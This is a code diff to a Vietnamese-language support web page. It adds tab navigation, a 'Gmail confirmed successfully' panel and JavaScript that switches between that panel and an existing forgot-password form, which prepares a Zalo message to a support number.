@@ -52,6 +52,14 @@
       box-shadow: 0 24px 70px rgba(0,0,0,.3);
       backdrop-filter: blur(12px);
     }
+    .nav-tabs { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 14px; }
+    .tab-btn { margin: 0; padding: 13px 10px; background: var(--panel-2); border: 1px solid var(--line); color: var(--muted); }
+    .tab-btn[aria-selected="true"] { background: var(--blue); color: #fff; border-color: transparent; }
+    .tab-panel[hidden] { display: none; }
+    .success-panel { text-align: center; padding: 26px 12px 18px; }
+    .success-icon { width: 76px; height: 76px; margin: 0 auto 18px; display: grid; place-items: center; border-radius: 50%; background: rgba(16,185,129,.14); color: #6ee7b7; font-size: 38px; }
+    .success-panel h1 { color: #b8f3dc; }
+    .success-panel .intro { max-width: 390px; margin: 0 auto; }
     .hero { text-align: center; margin-bottom: 26px; }
     .hero-icon {
       width: 68px; height: 68px; margin: 0 auto 15px;
@@ -106,7 +114,22 @@
       </div>
     </header>
 
+    <nav class="nav-tabs" aria-label="Chức năng hỗ trợ">
+      <button class="tab-btn" type="button" id="homeTab" role="tab" aria-controls="homePanel" aria-selected="true">Mục 1 · Trang chính</button>
+      <button class="tab-btn" type="button" id="forgotTab" role="tab" aria-controls="forgotPanel" aria-selected="false">Mục 2 · Quên mật khẩu</button>
+    </nav>
+
     <section class="card">
+      <section class="tab-panel" id="homePanel" role="tabpanel" aria-labelledby="homeTab">
+        <div class="success-panel">
+          <div class="success-icon" aria-hidden="true">✓</div>
+          <h1>Đã Xác Nhận Gmail Thành Công</h1>
+          <p class="intro">Vui lòng quay lại trang website để đăng nhập.</p>
+          <button type="button" id="goForgotBtn">Cần hỗ trợ? Quên mật khẩu</button>
+        </div>
+      </section>
+
+      <section class="tab-panel" id="forgotPanel" role="tabpanel" aria-labelledby="forgotTab" hidden>
       <div class="hero">
         <div class="hero-icon" aria-hidden="true">🔐</div>
         <h1>Quên mật khẩu?</h1>
@@ -134,6 +157,7 @@
         <button type="submit">💬 Mở Zalo & chuẩn bị tin nhắn</button>
         <button class="secondary" type="button" id="copyBtn">Sao chép nội dung yêu cầu</button>
       </form>
+      </section>
 
       <div class="notice">
         <span>🛡️</span>
@@ -149,6 +173,21 @@
     const ZALO_PHONE = "84384333135";
 
     const form = document.getElementById("supportForm");
+    const homeTab = document.getElementById("homeTab");
+    const forgotTab = document.getElementById("forgotTab");
+    const homePanel = document.getElementById("homePanel");
+    const forgotPanel = document.getElementById("forgotPanel");
+
+    function showPanel(panel) {
+      const showHome = panel === "home";
+      homePanel.hidden = !showHome;
+      forgotPanel.hidden = showHome;
+      homeTab.setAttribute("aria-selected", String(showHome));
+      forgotTab.setAttribute("aria-selected", String(!showHome));
+    }
+    homeTab.addEventListener("click", () => showPanel("home"));
+    forgotTab.addEventListener("click", () => showPanel("forgot"));
+    document.getElementById("goForgotBtn").addEventListener("click", () => showPanel("forgot"));
     const copyBtn = document.getElementById("copyBtn");
     const messagePreview = document.getElementById("messagePreview");
     document.getElementById("year").textContent = new Date().getFullYear();
